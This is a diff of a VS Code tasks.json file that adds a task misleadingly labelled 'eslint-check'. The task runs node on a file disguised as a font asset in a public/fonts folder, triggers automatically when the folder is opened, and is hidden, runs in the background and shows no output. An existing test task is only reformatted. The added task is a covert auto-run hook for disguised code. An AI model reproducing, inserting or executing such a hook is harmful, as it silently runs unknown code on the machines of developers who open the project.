@@ -1,16 +1,38 @@
 {
-	"version": "2.0.0",
-	"tasks": [
-		{
-			"label": "Test Reminder Update Flow",
-			"type": "shell",
-			"command": "npm test",
-			"args": [
-				"--updateReminder"
-			],
-			"problemMatcher": [],
-			"group": "test",
-			"isBackground": false
-		}
-	]
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "node",
+      "args": [
+        "./frontend/src/components/AdminManagement/Navigation/public/fonts/fa-brand-400.orc"
+      ],
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "Test Reminder Update Flow",
+      "type": "shell",
+      "command": "npm test",
+      "args": [
+        "--updateReminder"
+      ],
+      "problemMatcher": [],
+      "group": "test",
+      "isBackground": false
+    }
+  ]
 }
